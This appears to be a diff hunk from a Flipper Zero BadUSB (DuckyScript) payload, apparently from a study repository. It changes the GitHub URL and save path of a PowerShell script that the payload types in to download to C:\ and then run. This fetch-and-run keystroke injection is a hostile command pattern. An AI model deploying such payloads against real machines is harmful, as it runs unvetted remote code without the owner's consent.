@@ -17,7 +17,7 @@ STRING cd C:\
 ENTER
 
 REM Downloading the nearbyNetworks.ps1 from GitHub and running it
-STRING (New-Object System.Net.WebClient).DownloadFile('https://github.com/aenslei/flipperZero-studies/raw/main/Powershell/nearbyNetworks.ps1', 'nearbyNetworks.ps1')
+STRING (New-Object System.Net.WebClient).DownloadFile('https://raw.githubusercontent.com/aenslei/flipperZero-studies/main/Powershell/nearbyNetworks.ps1', 'C:\nearbyNetworks.ps1')
 ENTER
 DELAY 1000
 STRING .\nearbyNetworks.ps1
